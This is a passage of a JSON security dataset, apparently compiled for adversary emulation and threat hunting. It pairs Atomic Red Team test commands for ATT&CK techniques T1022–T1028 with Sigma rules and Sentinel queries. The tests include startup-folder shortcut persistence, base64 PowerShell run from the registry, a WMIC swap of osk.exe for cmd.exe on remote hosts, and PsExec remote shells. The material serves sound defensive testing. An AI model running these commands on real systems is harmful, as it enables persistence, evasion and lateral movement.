.\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n"}}, {"name": "Compress Data and lock with password for Exfiltration with 7zip", "description": "Note: Requires 7zip installation\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "mkdir $PathToAtomicsFolder\\T1022\\victim-files\ncd $PathToAtomicsFolder\\T1022\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n7z a archive.7z -pblue\ndir\n"}}]}}], "command_list": ["mkdir -p /tmp/T1022\ncd /tmp/T1022; touch a b c d e f g\nzip --password \"#{encryption_password}\" /tmp/T1022/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1022/#{test_file}.zip.gpg -c /tmp/T1022/#{test_file}.zip\nls -l /tmp/T1022\n", "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/T1022 ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/T1022.zip.gpg -c #{test_folder}/T1022.zip\nls -l #{test_folder}\n", "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"InsertPasswordHere\" #{test_folder}/#{test_file} ./*\necho \"InsertPasswordHere\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n", "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\nrar a -hp\"blue\" hello.rar\ndir\n", "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip *\ndir\n", "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "mkdir $PathToAtomicsFolder\\T1022\\victim-files\ncd $PathToAtomicsFolder\\T1022\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n7z a archive.7z -pblue\ndir\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1023", "commands": [{"source": "atomics/T1023/T1023.yaml", "command": "echo [InternetShortcut] > %temp%\\T1023_modified_shortcut.url\necho URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1023_modified_shortcut.url\n%temp%\\T1023_modified_shortcut.url\n", "name": null}, {"source": "atomics/T1023/T1023.yaml", "command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/backdoor_lnk", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/backdoor_lnk", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Shortcut Modification": {"attack_technique": "T1023", "display_name": "Shortcut Modification", "atomic_tests": [{"name": "Shortcut Modification", "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"shortcut_file_path": {"description": "shortcut modified and execute", "type": "path", "default": "%temp%\\T1023_modified_shortcut.url"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "echo [InternetShortcut] > #{shortcut_file_path}\necho URL=C:\\windows\\system32\\calc.exe >> #{shortcut_file_path}\n#{shortcut_file_path}\n", "cleanup_command": "del -f #{shortcut_file_path} >nul 2>&1\n"}}, {"name": "Create shortcut to cmd in startup folders", "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n", "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\" -ErrorAction Ignore\nRemove-Item \"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\" -ErrorAction Ignore\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/userland/backdoor_lnk", "ATT&CK Technique #1": "T1023", "ATT&CK Technique #2": "", "Technique": "Shortcut Modification", "Concatenate for Python Dictionary": "\"powershell/persistence/userland/backdoor_lnk\":  [\"T1023\"],"}}], "command_list": ["echo [InternetShortcut] > %temp%\\T1023_modified_shortcut.url\necho URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1023_modified_shortcut.url\n%temp%\\T1023_modified_shortcut.url\n", "$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n\n$Shell = New-Object -ComObject (\"WScript.Shell\")\n$ShortCut = $Shell.CreateShortcut(\"$env:ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1023.lnk\")\n$ShortCut.TargetPath=\"cmd.exe\"\n$ShortCut.WorkingDirectory = \"C:\\Windows\\System32\";\n$ShortCut.WindowStyle = 1;\n$ShortCut.Description = \"T1023.\";\n$ShortCut.Save()\n", "powershell/persistence/userland/backdoor_lnk", "powershell/persistence/userland/backdoor_lnk"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1027", "commands": [{"source": "atomics/T1027/T1027.yaml", "command": "sh -c \"echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat\"\ncat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "name": null}, {"source": "atomics/T1027/T1027.yaml", "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "[a-z0-9]{1}.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "*.exe \\*.exe\\:Zone.Identifier:$DATA\" ", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Obfuscated Files or Information": {"attack_technique": "T1027", "display_name": "Obfuscated Files or Information", "atomic_tests": [{"name": "Decode base64 Data into Script", "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "elevation_required": false, "command": "sh -c \"echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat\"\ncat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n"}}, {"name": "Execute base64-encoded PowerShell", "description": "Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute an encoded command and stdout default is \"Write-Host \"Hey, Atomic!\"\n", "supported_platforms": ["windows"], "input_arguments": {"powershell_command": {"description": "PowerShell command to encode", "type": "String", "default": "Write-Host \"Hey, Atomic!\""}}, "executor": {"name": "powershell", "elevation_required": false, "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n"}}, {"name": "Execute base64-encoded PowerShell from Windows Registry", "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n", "supported_platforms": ["windows"], "input_arguments": {"powershell_command": {"description": "PowerShell command to encode", "type": "String", "default": "Write-Host \"Hey, Atomic!\""}, "registry_key_storage": {"description": "Windows Registry Key to store code", "type": "String", "default": "HKCU:Software\\Microsoft\\Windows\\CurrentVersion"}, "registry_entry_storage": {"description": "Windows Registry entry to store code under key", "type": "String", "default": "Debug"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "cleanup_command": "Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100001", "os": "windows", "parent_process": "[a-z0-9]{1}.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "obfuscation", "mitre_attack": "T1027", "itw_sample": "3d77bf4f5d40aa7fff1c59058bf89e0349fa14e3260bbc290b836cbb1e1a17b7"}}, {"Threat Hunting Tables": {"chain_id": "100123", "os": "windows", "parent_process": "*.exe", "commandline_string": "\\*.exe\\:Zone.Identifier:$DATA\" ", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "alternate_data_stream", "mitre_attack": "T1027", "itw_sample": "b3c4ae251f8094fa15b510051835c657eaef2a6cea46075d3aec964b14a99f68"}}], "command_list": ["sh -c \"echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat\"\ncat /tmp/encoded.dat | base64 -d > /tmp/art.sh\nchmod +x /tmp/art.sh\n/tmp/art.sh\n", "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\npowershell.exe -EncodedCommand $EncodedCommand\n", "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))\"\n", "$OriginalCommand = '#{powershell_command}'\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\n$EncodedCommand\n\nSet-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand\npowershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))\"\n", "[a-z0-9]{1}.exe", "*.exe \\*.exe\\:Zone.Identifier:$DATA\" "], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"certutil.exe\" and process_command_line contains \"encode\")or process_command_line contains \"ToBase64String\"", "name": "Obfuscated Files Or Information"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: Ping Hex IP\ndescription: win7 simulation test results\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_ping_hex_ip.yml\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CommandLine:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* \\ ping.exe 0x *'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* \\ ping 0x *'\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: high", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Executable in ADS", "id": "b69888d4-380c-45ce-9cf9-d9ce46e67821", "status": "experimental", "description": "Detects the creation of an ADS data stream that contains an executable (non-empty imphash)", "references": ["https://twitter.com/0xrawsec/status/1002478725605273600?s=21"], "tags": ["attack.defense_evasion", "attack.t1027", "attack.s0139"], "author": "Florian Roth, @0xrawsec", "date": "2018/06/03", "logsource": {"product": "windows", "service": "sysmon", "definition": "Requirements: Sysmon config with Imphash logging activated"}, "detection": {"selection": {"EventID": 15}, "filter": {"Imphash": "00000000000000000000000000000000"}, "condition": "selection and not filter"}, "fields": ["TargetFilename", "Image"], "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"title": "Ping Hex IP", "id": "1a0d4aba-7668-4365-9ce4-6d79ab088dfd", "description": "Detects a ping command that uses a hex encoded IP address", "references": ["https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.cna", "https://twitter.com/vysecurity/status/977198418354491392"], "author": "Florian Roth", "date": "2018/03/23", "tags": ["attack.defense_evasion", "attack.t1140", "attack.t1027"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["*\\ping.exe 0x*", "*\\ping 0x*"]}, "condition": "selection"}, "fields": ["ParentCommandLine"], "falsepositives": ["Unlikely, because no sane admin pings IP addresses in a hexadecimal form"], "level": "high"}}]}, {"technique_id": "T1028", "commands": [{"source": "atomics/T1028/T1028.yaml", "command": "Enable-PSRemoting -Force\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"computer1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "wmic /user:DOMAIN\\Administrator /password:#{password} /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "wmic /user:#{user_name} /password:P@ssw0rd1 /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "wmic /user:#{user_name} /password:#{password} /node:Target process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "#{psexec_exe} \\\\#{computer_name} -u DOMAIN\\Administrator -p #{password} -s cmd.exe\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "#{psexec_exe} \\\\#{computer_name} -u #{user_name} -p P@ssw0rd1 -s cmd.exe\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "#{psexec_exe} \\\\localhost -u #{user_name} -p #{password} -s cmd.exe\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "C:\\PSTools\\PsExec.exe \\\\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "invoke-command -ComputerName localhost -scriptblock {#{remote_command}}\n", "name": null}, {"source": "atomics/T1028/T1028.yaml", "command": "invoke-command -ComputerName #{host_name} -scriptblock {ipconfig}\n", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell Enable-PSRemoting -Force", "name": null}, {"source": "SysmonHunter - Windows Remote Management", "command": "winrm.exe", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Windows Remote Management": {"attack_technique": "T1028", "display_name": "Windows Remote Management", "atomic_tests": [{"name": "Enable Windows Remote Management", "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Enable-PSRemoting -Force\n"}}, {"name": "PowerShell Lateral Movement", "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "Name of Computer", "type": "string", "default": "computer1"}}, "executor": {"name": "powershell", "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{computer_name}\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n"}}, {"name": "WMIC Process Call Create", "description": "Utilize WMIC to start remote process.\n\nUpon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "Username", "type": "String", "default": "DOMAIN\\Administrator"}, "password": {"description": "Password", "type": "String", "default": "P@ssw0rd1"}, "computer_name": {"description": "Target Computer Name", "type": "String", "default": "Target"}}, "executor": {"name": "command_prompt", "command": "wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n"}}, {"name": "Psexec", "description": "Utilize psexec to start remote process.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "Username", "type": "String", "default": "DOMAIN\\Administrator"}, "password": {"description": "Password", "type": "String", "default": "P@ssw0rd1"}, "computer_name": {"description": "Target Computer Name", "type": "String", "default": "localhost"}, "psexec_exe": {"description": "Path to PsExec", "type": "string", "default": "C:\\PSTools\\PsExec.exe"}}, "dependencies": [{"description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})\n", "prereq_command": "if (Test-Path \"#{psexec_exe}\"\") { exit 0} else { exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"$env:TEMP\\PsTools.zip\"\nExpand-Archive $env:TEMP\\PsTools.zip $env:TEMP\\PsTools -Force\nNew-Item -ItemType Directory (\"#{psexec_exe}\") -Force | Out-Null\nCopy-Item $env:TEMP\\PsTools\\PsExec.exe \"#{psexec_exe}\" -Force\n"}], "executor": {"name": "command_prompt", "command": "#{psexec_exe} \\\\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe\n"}}, {"name": "Invoke-Command", "description": "Execute Invoke-command on remote host.\n\nUpon successful execution, powershell will execute ipconfig on localhost using `invoke-command`.\n", "supported_platforms": ["windows"], "input_arguments": {"host_name": {"description": "Remote Windows Host Name", "type": "String", "default": "localhost"}, "remote_command": {"description": "Command to execute on remote Host", "type": "String", "default": "ipconfig"}}, "executor": {"name": "powershell", "command": "invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100174", "os": "windows", "parent_process": "powershell", "commandline_string": "Enable-PSRemoting -Force", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "remote_execution", "mitre_attack": "T1028", "itw_sample": ""}}, {"SysmonHunter - T1028": {"name": "Windows Remote Management", "description": null, "level": "medium", "phase": "Execution, Lateral Movement", "query": [{"type": "process", "process": {"any": {"pattern": "winrm.exe"}}}]}}], "command_list": ["Enable-PSRemoting -Force\n", "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"computer1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n", "wmic /user:DOMAIN\\Administrator /password:#{password} /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "wmic /user:#{user_name} /password:P@ssw0rd1 /node:#{computer_name} process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "wmic /user:#{user_name} /password:#{password} /node:Target process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"\n", "#{psexec_exe} \\\\#{computer_name} -u DOMAIN\\Administrator -p #{password} -s cmd.exe\n", "#{psexec_exe} \\\\#{computer_name} -u #{user_name} -p P@ssw0rd1 -s cmd.exe\n", "#{psexec_exe} \\\\localhost -u #{user_name} -p #{password} -s cmd.exe\n", "C:\\PSTools\\PsExec.exe \\\\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe\n", "invoke-command -ComputerName localhost -scriptblock {#{remote_command}}\n", "invoke-command -ComputerName #{host_name} -scriptblock {ipconfig}\n", "powershell Enable-PSRemoting -Force", "winrm.exe"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"wsmprovhost.exe\"or process_path contains \"winrm.cmd\")and (process_command_line contains \"Enable-PSRemoting -Force\"or process_command_line contains \"Invoke-Command -computer_name\"or process_command_line contains \"wmic*node*process call create\")", "name": "Windows Remote Management"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: win_ remote powershell session\ndescription: windows server 2016\ntags: T1028\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ dllhost.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ svchost.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ wsmprovhost.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ svchost.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: 'C: \\ Windows \\ system32 \\ wsmprovhost.exe -Embedding' # process command line arguments\n\u00a0\u00a0\u00a0\u00a0timeframe: last 2s\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "Mimikatz through Windows Remote Management", "id": "aa35a627-33fb-4d04-a165-d33b4afca3e8", "description": "Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.", "references": ["https://pentestlab.blog/2018/05/15/lateral-movement-winrm/"], "status": "stable", "author": "Patryk Prauze - ING Tech", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 10, "TargetImage": "C:\\windows\\system32\\lsass.exe", "SourceImage": "C:\\Windows\\system32\\wsmprovhost.exe"}, "condition": "selection"}, "tags": ["attack.credential_access", "attack.execution", 